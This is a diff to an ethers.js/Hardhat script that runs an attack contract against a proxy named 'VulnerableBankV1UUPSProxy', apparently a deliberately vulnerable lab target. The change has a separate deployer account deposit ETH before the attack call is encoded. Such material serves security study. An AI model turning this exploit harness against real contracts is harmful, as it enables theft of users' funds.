@@ -10,9 +10,12 @@ async function main() {
       addresses = JSON.parse(fs.readFileSync(addressesPath));
     }
 
-    // Get the provider and the attacker signer
-    const provider = new ethers.JsonRpcProvider(process.env.RPC_URL); // Replace with your network
-    const [attacker] = await ethers.getSigners();
+    // Get the provider and both signers
+    const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
+    const [attacker, deployer] = await ethers.getSigners();
+
+    console.log(`Attacker address: ${attacker.address}`);
+    console.log(`Deployer address: ${deployer.address}`);
 
     let attackContract;
     let attackContractAddress;
@@ -54,7 +57,7 @@ async function main() {
     const attackerBalance = await provider.getBalance(attacker.address);
     console.log(`Attacker balance: ${ethers.formatEther(attackerBalance)} ETH`);
 
-    // Call the deposit function in the proxy contract
+    // Call the deposit function in the proxy contract using the deployer
     console.log(`Calling deposit function in proxy contract at: ${addresses.VulnerableBankV1UUPSProxy}`);
     const proxyContract = new ethers.Contract(
       addresses.VulnerableBankV1UUPSProxy,
@@ -62,7 +65,7 @@ async function main() {
         // ABI fragment for the deposit function
         "function deposit() payable"
       ],
-      attacker
+      deployer
     );
     const depositTx = await proxyContract.deposit({
       value: ethers.parseEther("0.00005"),
@@ -71,7 +74,7 @@ async function main() {
       // maxFeePerGas: ethers.parseUnits('100', 'gwei')
     });
     await depositTx.wait();
-    console.log("0.00005 ETH Deposited successfully.");
+    console.log("0.00005 ETH Deposited successfully by deployer.");
 
     // Prepare the transaction data for the attack function
     const txData = attackContract.interface.encodeFunctionData("attack", []);
